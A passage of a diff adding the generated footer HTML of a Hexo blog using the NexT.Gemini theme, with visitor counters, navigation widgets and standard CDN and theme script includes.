+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
